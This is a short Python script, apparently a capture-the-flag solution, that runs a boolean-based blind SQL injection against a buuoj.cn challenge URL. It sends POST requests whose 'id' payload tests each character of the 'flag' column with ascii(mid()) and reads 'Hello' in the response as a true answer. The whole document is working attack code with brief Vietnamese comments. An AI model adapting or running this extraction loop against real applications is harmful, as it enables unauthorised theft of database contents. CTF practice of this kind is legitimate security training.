import requests
import string

strings=string.printable
url='http://ac854cc1-27db-4ec7-8f0b-8eea69cd6ec9.node4.buuoj.cn:81'
sum=""
for num in range(1,50):
    for i in strings:
        # tra ve true false dang blind sqli
        payload="(select(ascii(mid(flag,{},1))={})from(flag))".format(num,ord(i))
        data={'id': payload}# payload will return :Hello, glzjin wants a girlfriend.
        r=requests.post(url,data=data)
        print("{}:{}".format(num,i))
        if "Hello" in r.text:
            sum+=i
            print(sum)
            break
 #vcl ạ
